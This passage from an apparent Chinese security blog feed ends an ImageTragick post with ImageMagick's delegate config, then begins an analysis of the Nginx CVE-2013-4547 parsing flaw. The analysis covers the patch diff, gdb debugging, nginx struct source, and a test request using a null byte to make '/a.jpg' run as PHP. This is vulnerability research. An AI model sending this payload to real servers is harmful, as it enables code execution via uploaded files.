-input-format pnm -output-format svg -output-file &amp;quot;%o&amp;quot; &amp;quot;%u&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;blender&quot; command=&quot;&amp;quot;blender&amp;quot; -b &amp;quot;%i&amp;quot; -F PNG -o &amp;quot;%o&amp;quot;&amp;quot;\n&amp;quot;convert&amp;quot; -concatenate &amp;quot;%o*.png&amp;quot; &amp;quot;%o&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;browse&quot; stealth=&quot;True&quot; spawn=&quot;True&quot; command=&quot;&amp;quot;xdg-open&amp;quot; http://www.imagemagick.org/; rm &amp;quot;%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;cdr&quot; command=&quot;&amp;quot;uniconvertor&amp;quot; &amp;quot;%i&amp;quot; &amp;quot;%o.svg&amp;quot;; mv &amp;quot;%o.svg&amp;quot; &amp;quot;%o&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;cgm&quot; thread-support=&quot;False&quot; command=&quot;&amp;quot;ralcgm&amp;quot; -d ps -oC &amp;lt; &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot; 2&amp;gt; &amp;quot;%Z&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;dvi&quot; command=&quot;&amp;quot;dvips&amp;quot; -q -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;dng:decode&quot; command=&quot;&amp;quot;ufraw-batch&amp;quot; --silent --create-id=also --out-type=png --out-depth=16 &amp;quot;--output=%u.png&amp;quot; &amp;quot;%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;dot&quot; command=&apos;&amp;quot;dot&amp;quot; -Tsvg &amp;quot;%i&amp;quot; -o &amp;quot;%o&amp;quot;&apos; /&gt;</div><div class="line">&lt;delegate decode=&quot;edit&quot; stealth=&quot;True&quot; command=&quot;&amp;quot;/etc/alternatives/x-terminal-emulator&amp;quot; -title &amp;quot;Edit Image Comment&amp;quot; -e vi &amp;quot;%o&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;eps&quot; encode=&quot;pdf&quot; mode=&quot;bi&quot; command=&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 &amp;quot;-sDEVICE=pdfwrite&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;eps&quot; encode=&quot;ps&quot; mode=&quot;bi&quot; command=&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=nodevice&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;fig&quot; command=&quot;&amp;quot;fig2dev&amp;quot; -L ps &amp;quot;%i&amp;quot; &amp;quot;%o&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;plt&quot; command=&quot;&amp;quot;echo&amp;quot; &amp;quot;set size 1.25,0.62; set terminal postscript portrait color solid; set output \&apos;%o\&apos;; load \&apos;%i\&apos;&amp;quot; &amp;gt; &amp;quot;%u&amp;quot;;&amp;quot;gnuplot&amp;quot; &amp;quot;%u&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;hpg&quot; command=&quot;&amp;quot;hp2xx&amp;quot; -q -m eps -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%i&amp;quot;;     mv -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%o&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;hpgl&quot; command=&quot;if [ -e hp2xx -o -e /usr/bin/hp2xx ]; then     hp2xx -q -m eps -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%i&amp;quot;;     mv -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%o&amp;quot;;   else     echo &amp;quot;You need to install hp2xx to use HPGL files with ImageMagick.&amp;quot;;     exit 1;   fi&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;htm&quot; command=&quot;&amp;quot;html2ps&amp;quot; -U -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;html&quot; command=&quot;&amp;quot;html2ps&amp;quot; -U -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;https&quot; command=&quot;&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;ilbm&quot; command=&quot;&amp;quot;ilbmtoppm&amp;quot; &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;man&quot; command=&quot;&amp;quot;groff&amp;quot; -man -Tps &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;mpeg:decode&quot; command=&quot;&amp;quot;ffmpeg&amp;quot; -v -1 -i &amp;quot;%i&amp;quot; -vframes %S -vcodec pam -an -f rawvideo -y &amp;quot;%u.pam&amp;quot; 2&amp;gt; &amp;quot;%Z&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate encode=&quot;mpeg:encode&quot; stealth=&quot;True&quot; command=&quot;&amp;quot;ffmpeg&amp;quot; -v -1 -mbd rd -trellis 2 -cmp 2 -subcmp 2 -g 300 -i &amp;quot;%M%%d.jpg&amp;quot; &amp;quot;%u.%m&amp;quot; 2&amp;gt; &amp;quot;%Z&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;sid&quot; command=&quot;&amp;quot;mrsidgeodecode&amp;quot; -if sid -i &amp;quot;%i&amp;quot; -of tif -o &amp;quot;%o&amp;quot; &amp;gt; &amp;quot;%u&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;pcl:color&quot; stealth=&quot;True&quot; command=&quot;&amp;quot;pcl6&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=ppmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;pcl:cmyk&quot; stealth=&quot;True&quot; command=&quot;&amp;quot;pcl6&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pamcmyk32&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;pcl:mono&quot; stealth=&quot;True&quot; command=&quot;&amp;quot;pcl6&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pbmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;pdf&quot; encode=&quot;eps&quot; mode=&quot;bi&quot; command=&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=epswrite&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;pdf&quot; encode=&quot;ps&quot; mode=&quot;bi&quot; command=&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=nodevice&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;tiff&quot; encode=&quot;launch&quot; mode=&quot;encode&quot; command=&quot;&amp;quot;gimp&amp;quot; &amp;quot;%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;pnm&quot; encode=&quot;ilbm&quot; mode=&quot;encode&quot; command=&quot;&amp;quot;ppmtoilbm&amp;quot; -24if &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;pov&quot; command=&quot;&amp;quot;povray&amp;quot; &amp;quot;+i%i&amp;quot; -D0 &amp;quot;+o%o&amp;quot; +fn%q +w%w +h%h +a -q9 &amp;quot;-kfi%s&amp;quot; &amp;quot;-kff%n&amp;quot;;&amp;quot;convert&amp;quot; -concatenate &amp;quot;%o*.png&amp;quot; &amp;quot;%o&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;ps&quot; encode=&quot;eps&quot; mode=&quot;bi&quot; command=&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=epswrite&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;ps&quot; encode=&quot;pdf&quot; mode=&quot;bi&quot; command=&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pdfwrite&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;ps&quot; encode=&quot;print&quot; mode=&quot;encode&quot; command=&quot;lpr &amp;quot;%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;ps:alpha&quot; stealth=&quot;True&quot; command=&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pngalpha&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;ps:cmyk&quot; stealth=&quot;True&quot; command=&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pam&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;ps:color&quot; stealth=&quot;True&quot; command=&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pnmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;ps:mono&quot; stealth=&quot;True&quot; command=&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pbmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;rgba&quot; encode=&quot;rle&quot; mode=&quot;encode&quot; command=&quot;&amp;quot;rawtorle&amp;quot; -o &amp;quot;%o&amp;quot; -v &amp;quot;%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;scan&quot; command=&quot;&amp;quot;scanimage&amp;quot; -d &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;scanx&quot; command=&quot;&amp;quot;scanimage&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;miff&quot; encode=&quot;show&quot; spawn=&quot;True&quot; command=&quot;&amp;quot;/usr/bin/display&amp;quot; -delay 0 -window-group %[group] -title &amp;quot;%l &amp;quot; &amp;quot;ephemeral:%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;shtml&quot; command=&quot;&amp;quot;html2ps&amp;quot; -U -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;svg&quot; command=&quot;&amp;quot;rsvg-convert&amp;quot; -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;txt&quot; encode=&quot;ps&quot; mode=&quot;bi&quot; command=&quot;&amp;quot;enscript&amp;quot; -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;miff&quot; encode=&quot;win&quot; stealth=&quot;True&quot; spawn=&quot;True&quot; command=&quot;&amp;quot;/usr/bin/display&amp;quot; -immutable -delay 0 -window-group %[group] -title &amp;quot;%l &amp;quot; &amp;quot;ephemeral:%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;wmf&quot; command=&quot;&amp;quot;wmf2eps&amp;quot; -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;xps:color&quot; stealth=&quot;True&quot; command=&quot;&amp;quot;gxps&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=ppmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;xps:cmyk&quot; stealth=&quot;True&quot; command=&quot;&amp;quot;gxps&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=bmpsep8&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;&quot;/&gt;</div><div class="line">&lt;delegate decode=&quot;xps:mono&quot; stealth=&quot;True&quot; command=&quot;&amp;quot;gxps&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pbmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;&quot;/&gt;</div><div class="line">&lt;/delegatemap&gt;</div></pre></td></tr></table></figure>
<p><img src="/old/2017/10/10/Imagetragick/4116422802.png" alt="B487FA86-DEA2-4A3F-9AA3-E2AA9A2D1170.png"><br>Reference:</p>
<p><a href="http://blog.csdn.net/liujiyong7/article/details/44833475" target="_blank" rel="external">囧囧有神的博客</a></p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> Imagetragick </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Nginx-HTTP-Parse 文件解析漏洞]]></title>
      <url>/2017/10/10/Nginx-HTTP-Parse-Vulnerability/</url>
      <content type="html"><![CDATA[<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>CVE-2013-4547是Nginx出现过的一个解析漏洞，</p>
<p>官方的补丁打在了_ngx_http<em>parse.c</em>上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">--- src/http/ngx_http_parse.c</div><div class="line">+++ src/http/ngx_http_parse.c</div><div class="line">@@ <span class="number">-617</span>,<span class="number">6</span> +<span class="number">617</span>,<span class="number">7</span> @@ ngx_http_parse_request_line(ngx_http_req</div><div class="line"><span class="keyword">default</span>:</div><div class="line">r-&gt;space_in_uri = <span class="number">1</span>;</div><div class="line">state = sw_check_uri;</div><div class="line">+                p--;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">@@ <span class="number">-670</span>,<span class="number">6</span> +<span class="number">671</span>,<span class="number">7</span> @@ ngx_http_parse_request_line(ngx_http_req</div><div class="line"><span class="keyword">default</span>:</div><div class="line">r-&gt;space_in_uri = <span class="number">1</span>;</div><div class="line">state = sw_uri;</div><div class="line">+                p--;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h2><p>使用gdb调试nginx，将断点下在<code>/nginx-1.5.6/src/http/ngx_http_parse.c</code>的<code>ngx_http_parse_request_line</code>上，</p>
<p>发送了测试payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">GET /a.jpg /0.php HTTP/1.1</div><div class="line">Host: 127.0.0.1</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36</div><div class="line">Accept-Encoding: gzip, deflate, sdch</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en;q=0.6</div></pre></td></tr></table></figure>
<p><code>/a.jpg /0.php</code>中的空格是hex 00，非真正的空格</p>
<p>传入的http请求只接收到了<code>/a.jpg</code></p>
<p>ngx_http_parse_request_line传入了两个ngx_http_request_t类和ngx_buf_t类的指针，ngx_http_request_t在以下文件中定义了一个别名</p>
<p>文件:  _/src/http/ngx_http<em>request.h</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ngx_http_request_s</span>     <span class="title">ngx_http_request_t</span>;</span></div></pre></td></tr></table></figure>
<p>ngx_http_request_s的结构成员</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ngx_http_request_s</span> &#123;</span></div><div class="line"><span class="keyword">uint32_t</span>                          signature;         <span class="comment">/* "HTTP" */</span></div><div class="line"></div><div class="line"><span class="keyword">ngx_connection_t</span>                 *connection;</div><div class="line"></div><div class="line"><span class="keyword">void</span>                            **ctx;</div><div class="line"><span class="keyword">void</span>                            **main_conf;</div><div class="line"><span class="keyword">void</span>                            **srv_conf;</div><div class="line"><span class="keyword">void</span>                            **loc_conf;</div><div class="line"></div><div class="line">ngx_http_event_handler_pt         read_event_handler;</div><div class="line">ngx_http_event_handler_pt         write_event_handler;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> (NGX_HTTP_CACHE)</span></div><div class="line"><span class="keyword">ngx_http_cache_t</span>                 *cache;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="keyword">ngx_http_upstream_t</span>              *upstream;</div><div class="line"><span class="keyword">ngx_array_t</span>                      *upstream_states;</div><div class="line"><span class="comment">/* of ngx_http_upstream_state_t */</span></div><div class="line"></div><div class="line"><span class="keyword">ngx_pool_t</span>                       *pool;</div><div class="line"><span class="keyword">ngx_buf_t</span>                        *header_in;</div><div class="line"></div><div class="line"><span class="keyword">ngx_http_headers_in_t</span>             headers_in;</div><div class="line"><span class="keyword">ngx_http_headers_out_t</span>            headers_out;</div><div class="line"></div><div class="line"><span class="keyword">ngx_http_request_body_t</span>          *request_body;</div><div class="line"></div><div class="line"><span class="keyword">time_t</span>                            lingering_time;</div><div class="line"><span class="keyword">time_t</span>                            start_sec;</div><div class="line"><span class="keyword">ngx_msec_t</span>                        start_msec;</div><div class="line"></div><div class="line"><span class="keyword">ngx_uint_t</span>                        method;</div><div class="line"><span class="keyword">ngx_uint_t</span>                        http_version;</div><div class="line"></div><div class="line"><span class="keyword">ngx_str_t</span>                         request_line;</div><div class="line"><span class="keyword">ngx_str_t</span>                         uri;</div><div class="line"><span class="keyword">ngx_str_t</span>                         args;</div><div class="line"><span class="keyword">ngx_str_t</span>                         exten;</div><div class="line"><span class="keyword">ngx_str_t</span>                         unparsed_uri;</div><div class="line"></div><div class="line"><span class="keyword">ngx_str_t</span>                         method_name;</div><div class="line"><span class="keyword">ngx_str_t</span>                         http_protocol;</div><div class="line"></div><div class="line"><span class="keyword">ngx_chain_t</span>                      *out;</div><div class="line"><span class="keyword">ngx_http_request_t</span>               *main;</div><div class="line"><span class="keyword">ngx_http_request_t</span>               *parent;</div><div class="line"><span class="keyword">ngx_http_postponed_request_t</span>     *postponed;</div><div class="line"><span class="keyword">ngx_http_post_subrequest_t</span>       *post_subrequest;</div><div class="line"><span class="keyword">ngx_http_posted_request_t</span>        *posted_requests;</div><div class="line"></div><div class="line"><span class="keyword">ngx_int_t</span>                         phase_handler;</div><div class="line">ngx_http_handler_pt               content_handler;</div><div class="line"><span class="keyword">ngx_uint_t</span>                        access_code;</div><div class="line"></div><div class="line"><span class="keyword">ngx_http_variable_value_t</span>        *variables;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> (NGX_PCRE)</span></div><div class="line"><span class="keyword">ngx_uint_t</span>                        ncaptures;</div><div class="line"><span class="keyword">int</span>                              *captures;</div><div class="line">u_char                           *captures_data;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="keyword">size_t</span>                            limit_rate;</div><div class="line"><span class="keyword">size_t</span>                            limit_rate_after;</div><div class="line"></div><div class="line"><span class="comment">/* used to learn the Apache compatible response length without a header */</span></div><div class="line"><span class="keyword">size_t</span>                            header_size;</div><div class="line"></div><div class="line"><span class="keyword">off_t</span>                             request_length;</div><div class="line"></div><div class="line"><span class="keyword">ngx_uint_t</span>                        err_status;</div><div class="line"></div><div class="line"><span class="keyword">ngx_http_connection_t</span>            *http_connection;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> (NGX_HTTP_SPDY)</span></div><div class="line"><span class="keyword">ngx_http_spdy_stream_t</span>           *spdy_stream;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">ngx_http_log_handler_pt           log_handler;</div><div class="line"></div><div class="line"><span class="keyword">ngx_http_cleanup_t</span>               *cleanup;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>                          subrequests:<span class="number">8</span>;</div><div class="line"><span class="keyword">unsigned</span>                          count:<span class="number">8</span>;</div><div class="line"><span class="keyword">unsigned</span>                          blocked:<span class="number">8</span>;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>                          aio:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span>                          http_state:<span class="number">4</span>;</div><div class="line"></div><div class="line"><span class="comment">/* URI with "/." and on Win32 with "//" */</span></div><div class="line"><span class="keyword">unsigned</span>                          complex_uri:<span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="comment">/* URI with "%" */</span></div><div class="line"><span class="keyword">unsigned</span>                          quoted_uri:<span class="number">1</span>;</div><div 